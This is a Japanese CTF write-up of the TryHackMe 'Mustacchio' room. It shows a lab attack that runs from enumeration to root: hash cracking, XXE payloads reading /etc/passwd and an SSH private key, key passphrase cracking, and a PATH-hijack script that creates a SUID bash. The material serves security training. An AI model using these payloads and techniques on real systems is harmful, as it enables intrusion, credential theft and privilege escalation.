# Mustacchio CTF

https://tryhackme.com/room/mustacchio

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.49.102
root@ip-10-10-145-110:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 06:17 GMT
Nmap scan report for 10.10.49.102
Host is up (0.00051s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
MAC Address: 02:16:1D:B5:37:93 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 104.17 seconds
root@ip-10-10-145-110:~# sudo nmap -sV -p22,80,8765 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 06:20 GMT
Nmap scan report for 10.10.49.102
Host is up (0.00025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
MAC Address: 02:16:1D:B5:37:93 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
```

80 と 8765 に HTTP がある。

### gobuster

```shell
root@ip-10-10-145-110:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.49.102
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://10.10.49.102/images/]
/custom               (Status: 301) [Size: 313] [--> http://10.10.49.102/custom/]
/robots.txt           (Status: 200) [Size: 28]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.49.102/fonts/]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

### /custom/js/users.bak

sqlite データベース。1 データだけ含まれていた。

admin / 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

```shell
hashcat -m 100 hash.txt rockyou.txt

1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19

Session..........: hashcat
Status...........: Cracked
```

admin / bulldog19 と判明。

これを使って、8765 ポートのログイン画面でログインできた。

## home.php

テキストボックスと Submit ボタンがある。

```html
<script type="text/javascript">
    //document.cookie = "Example=/auth/dontforget.bak";
    function checktarea() {
    let tbox = document.getElementById("box").value;
    if (tbox == null || tbox.length == 0) {
    alert("Insert XML Code!")
    }

<!-- Barry, you can now SSH in using your key!-->
```

- テキストボックスに XML コードの入力を想定している
- barry ユーザーが存在し、SSH キーでログイン可能

### /auth/dontforget.bak

```shell
$ file ./dontforget.bak
./dontforget.bak: XML 1.0 document, Unicode text, UTF-8 text, with very long lines (873), with CRLF line terminators

$ cat ./dontforget.bak
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

### XXE

サンプルの XML を元に、下記のような XXE が可能。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

barry の SSH 秘密鍵を入手できるか試す。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

入手成功。

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
（ひみつ）
-----END RSA PRIVATE KEY-----
```

秘密鍵からパスフレーズをクラック

```shell
$ ssh2john ./id_rsa_barry > hash_barry.txt
```

```shell
hashcat -m 22931 hash.txt rockyou.txt

679617488480d30ccb04c2300203eabaf3af9b44477e76b6a3824e91f5e2a048c13b81e543:urieljames

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22931 (RSA/DSA/EC/OpenSSH Private Keys ($1, $3$))
Hash.Target......: $sshng$1$16$d137279d69a43e71bb7fcb87fc61d25e$1200$8...81e543
```

成功。urieljames

```shell
$ ssh barry@10.10.49.102 -i ./id_rsa_barry

barry@mustacchio:~$
```

SSH 接続成功。

```shell
barry@mustacchio:~$ ls -al
total 20
drwxr-xr-x 4 barry barry 4096 Mar 12 07:12 .
drwxr-xr-x 4 root  root  4096 Jun 12  2021 ..
drwx------ 2 barry barry 4096 Mar 12 07:12 .cache
drwxr-xr-x 2 barry barry 4096 Jun 12  2021 .ssh
-rw-r--r-- 1 barry barry   33 Jun 12  2021 user.txt
barry@mustacchio:~$ cat user.txt
62d..............................
```

ユーザーフラグゲット。

## 権限昇格

SUID

```shell
barry@mustacchio:~$ find / -perm -u=s -type f -ls 2>/dev/null
    26223     84 -rwsr-xr-x   1 root     root        84120 Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    29343     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
    29386     16 -rwsr-xr-x   1 root     root        14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
    29788    112 -rwsr-xr-x   1 root     root       110792 Feb  8  2021 /usr/lib/snapd/snap-confine
    29776    420 -rwsr-xr-x   1 root     root       428240 May 26  2020 /usr/lib/openssh/ssh-keysign
    29454     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    24360     56 -rwsr-xr-x   1 root     root          54256 Mar 26  2019 /usr/bin/passwd
    24749     24 -rwsr-xr-x   1 root     root          23376 Mar 27  2019 /usr/bin/pkexec
    24359     72 -rwsr-xr-x   1 root     root          71824 Mar 26  2019 /usr/bin/chfn
    24265     40 -rwsr-xr-x   1 root     root          39904 Mar 26  2019 /usr/bin/newgrp
    24688     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at
    24363     40 -rwsr-xr-x   1 root     root          40432 Mar 26  2019 /usr/bin/chsh
    24578     36 -rwsr-xr-x   1 root     root          32944 Mar 26  2019 /usr/bin/newgidmap
    24297    136 -rwsr-xr-x   1 root     root         136808 Jan 20  2021 /usr/bin/sudo
    24579     36 -rwsr-xr-x   1 root     root          32944 Mar 26  2019 /usr/bin/newuidmap
    24361     76 -rwsr-xr-x   1 root     root          75304 Mar 26  2019 /usr/bin/gpasswd
   257605     20 -rwsr-xr-x   1 root     root          16832 Jun 12  2021 /home/joe/live_log
      120     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
      119     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
      104     28 -rwsr-xr-x   1 root     root          27608 Jan 27  2020 /bin/umount
      103     40 -rwsr-xr-x   1 root     root          40152 Jan 27  2020 /bin/mount
      151     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
       87     40 -rwsr-xr-x   1 root     root          40128 Mar 26  2019 /bin/su
```

/home/joe/live_log に、root の SUID が付いている。

```shell
barry@mustacchio:~$ ls -al /home/joe
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12  2021 .
drwxr-xr-x 4 root root  4096 Jun 12  2021 ..
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log

barry@mustacchio:~$ file /home/joe/live_log
/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

strings で下記の文字列を発見。

```text
tail -f /var/log/nginx/access.log
```

相対パスなので、PATH 挿入できると思われる。

bash をコピーして SUID を付ける、偽 tail コマンドの準備

```shell
barry@mustacchio:~$ cat /home/barry/tail
#!/bin/bash

cp /bin/bash /home/barry/
chmod +s /home/barry/bash

barry@mustacchio:~$ chmod +x /home/barry/tail
```

エクスプロイト

```shell
barry@mustacchio:~$ export PATH=/home/barry:$PATH
barry@mustacchio:~$ /home/joe/live_log
Live Nginx Log Readerbarry@mustacchio:~$ ls -al
total 1044
drwxr-xr-x 5 barry barry    4096 Mar 12 07:21 .
drwxr-xr-x 4 root  root     4096 Jun 12  2021 ..
-rwsr-sr-x 1 root  root  1037528 Mar 12 07:21 bash
drwx------ 2 barry barry    4096 Mar 12 07:12 .cache
drwxrwxr-x 2 barry barry    4096 Mar 12 07:19 .nano
drwxr-xr-x 2 barry barry    4096 Jun 12  2021 .ssh
-rwxrwxr-x 1 barry barry      67 Mar 12 07:20 tail
-rw-r--r-- 1 barry barry      33 Jun 12  2021 user.txt
```

bash が SUID 付きでコピーされた。

root 昇格

```shell
barry@mustacchio:~$ ./bash -p
bash-4.3# whoami
root
bash-4.3# ls /root
root.txt
bash-4.3# cat /root/root.txt
32.....................................
```

ルートフラグゲット！

## 振り返り

- CTF で XXE を実際に使ったのは初めてかもしれない。
- 程よくヒントがちりばめられていて楽しかった。
